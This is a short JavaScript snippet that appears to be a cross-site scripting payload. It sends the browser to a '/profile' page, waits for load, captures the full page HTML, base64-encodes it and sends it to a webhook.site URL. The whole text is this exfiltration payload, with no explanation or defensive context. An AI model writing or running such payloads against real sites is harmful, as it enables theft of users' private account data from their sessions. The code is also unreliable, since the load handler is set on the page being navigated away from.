// 1. Navigate to profile
window.location = '/profile';

// 2. After page loads, send its content
window.addEventListener('load', function() {
    setTimeout(() => {
        var profileContent = document.documentElement.outerHTML;
        fetch('https://webhook.site/04e02681-01c6-43b0-adf8-8b311acc9b60/?navigated=' + 
              btoa(profileContent));
    }, 2000);
});
